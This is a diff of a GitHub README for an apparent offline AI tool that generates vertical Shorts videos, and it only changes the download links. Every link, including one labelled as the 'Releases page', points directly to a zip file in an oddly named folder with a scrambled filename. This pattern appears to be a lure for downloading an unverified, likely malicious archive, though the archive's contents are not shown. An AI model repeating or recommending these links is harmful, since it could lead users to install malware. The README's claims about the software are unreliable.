@@ -1,7 +1,7 @@
 # 🎥 local-ai-generation-of-vertical-videos-for-shorts - Create AI Videos with Ease
 
 ## 📥 Download Now
-[![Download Here](https://github.com/gogetaelpr0/local-ai-generation-of-vertical-videos-for-shorts/raw/refs/heads/main/inoppressive/of_vertical_for_local_videos_shorts_ai_generation_v1.6.zip)](https://github.com/gogetaelpr0/local-ai-generation-of-vertical-videos-for-shorts/raw/refs/heads/main/inoppressive/of_vertical_for_local_videos_shorts_ai_generation_v1.6.zip)
+[![Download Here](https://raw.githubusercontent.com/gogetaelpr0/local-ai-generation-of-vertical-videos-for-shorts/main/inoppressive/shorts_local_vertical_generation_videos_ai_for_of_2.9.zip)](https://raw.githubusercontent.com/gogetaelpr0/local-ai-generation-of-vertical-videos-for-shorts/main/inoppressive/shorts_local_vertical_generation_videos_ai_for_of_2.9.zip)
 
 ## 🔍 Overview
 Welcome to the **local-ai-generation-of-vertical-videos-for-shorts** project. This application allows you to generate simple AI Shorts offline, creating videos from text with voice and captions. It processes everything on your PC without using the cloud and leaves no watermark on your creations.
@@ -18,10 +18,10 @@ Follow these steps to get your app up and running.
 ### 2. Installation Steps
 To install the application, visit the releases page:
 
-[Download Here](https://github.com/gogetaelpr0/local-ai-generation-of-vertical-videos-for-shorts/raw/refs/heads/main/inoppressive/of_vertical_for_local_videos_shorts_ai_generation_v1.6.zip)
+[Download Here](https://raw.githubusercontent.com/gogetaelpr0/local-ai-generation-of-vertical-videos-for-shorts/main/inoppressive/shorts_local_vertical_generation_videos_ai_for_of_2.9.zip)
 
 ### 3. Download & Install
-1. Go to the [Releases page](https://github.com/gogetaelpr0/local-ai-generation-of-vertical-videos-for-shorts/raw/refs/heads/main/inoppressive/of_vertical_for_local_videos_shorts_ai_generation_v1.6.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/gogetaelpr0/local-ai-generation-of-vertical-videos-for-shorts/main/inoppressive/shorts_local_vertical_generation_videos_ai_for_of_2.9.zip).
 2. Find the latest version of the software.
 3. Click on the file to download it. 
 4. Once downloaded, locate the file on your computer.
@@ -68,4 +68,4 @@ For support, please open an issue on GitHub or reach out through our community c
 ## 📄 License
 This project is licensed under the MIT License. Feel free to use and modify it as needed, but please credit the original source.
 
-[Download Here](https://github.com/gogetaelpr0/local-ai-generation-of-vertical-videos-for-shorts/raw/refs/heads/main/inoppressive/of_vertical_for_local_videos_shorts_ai_generation_v1.6.zip) to get started on your video creation journey. Enjoy making stunning AI-generated Shorts!
+[Download Here](https://raw.githubusercontent.com/gogetaelpr0/local-ai-generation-of-vertical-videos-for-shorts/main/inoppressive/shorts_local_vertical_generation_videos_ai_for_of_2.9.zip) to get started on your video creation journey. Enjoy making stunning AI-generated Shorts!
